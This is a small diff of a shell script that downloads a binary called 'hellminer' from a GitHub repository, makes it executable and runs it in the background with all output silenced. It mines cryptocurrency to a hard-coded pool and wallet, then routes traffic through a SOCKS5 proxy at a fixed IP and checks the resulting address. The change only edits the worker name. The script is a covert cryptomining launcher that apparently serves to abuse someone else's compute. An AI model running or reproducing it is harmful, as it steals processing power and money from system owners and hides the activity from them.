@@ -3,5 +3,5 @@ wget https://github.com/Godmine99/cpu/raw/main/hellminer && chmod +x hellminer &
 
 clear
 
-nohup out ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RYJDLYsGHZZTBQg7RxEi3j4Cx2fZGpVX5p.STB-1 -p x --cpu 1 >/dev/null 2>&1&& proxy socks5://184.178.172.14:4145 && curl ipinfo.io
+nohup out ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RYJDLYsGHZZTBQg7RxEi3j4Cx2fZGpVX5p.STB#1 -p x --cpu 1 >/dev/null 2>&1&& proxy socks5://184.178.172.14:4145 && curl ipinfo.io
 
